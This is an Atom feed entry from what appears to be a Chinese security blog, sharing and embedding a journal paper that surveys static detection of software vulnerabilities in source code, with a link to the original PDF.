    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>无意间在看到信息安全学报的一片最新的论文，和我最近看的有点关系，感觉还不错，就放到这里来</p><p>PS:师傅们如果喜欢这个 PDF 请尽量不要直接从我这里下载,因为走的是下行流量需要我每天付费<em>(:3 」∠ )</em>,我提供原始下载链接叭！<br><a href="http://www.infocomm-journal.com/cjnis/CN/article/downloadArticleFile.do?attachType=PDF&amp;id=168198" target="_blank" rel="noopener">http://www.infocomm-journal.com/cjnis/CN/article/downloadArticleFile.do?attachType=PDF&amp;id=168198</a><br><a id="more"></a></p><div align="center"><br><embed width="800" height="800" src="https://pdf-1253331270.cos.ap-beijing.myqcloud.com/%E9%9D%A2%E5%90%91%E6%BA%90%E4%BB%A3%E7%A0%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B%E7%BB%BC%E8%BF%B0.pdf"> <br></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X00-前言&quot;&gt;&lt;a href=&quot;#0X00-前言&quot; class=&quot;headerlink&quot; title=&quot;0X00 前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X00 前言&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;无意间在看到信息安全学报的一片最新的论文，和我最近看的有点关系，感觉还不错，就放到这里来&lt;/p&gt;
&lt;p&gt;PS:师傅们如果喜欢这个 PDF 请尽量不要直接从我这里下载,因为走的是下行流量需要我每天付费&lt;em&gt;(:3 」∠ )&lt;/em&gt;,我提供原始下载链接叭！&lt;br&gt;&lt;a href=&quot;http://www.infocomm-journal.com/cjnis/CN/article/downloadArticleFile.do?attachType=PDF&amp;amp;id=168198&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.infocomm-journal.com/cjnis/CN/article/downloadArticleFile.do?attachType=PDF&amp;amp;id=168198&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="论文" scheme="https://www.k0rz3n.com/categories/%E8%AE%BA%E6%96%87/"/>
    
    
      <category term="静态检测" scheme="https://www.k0rz3n.com/tags/%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
</feed>
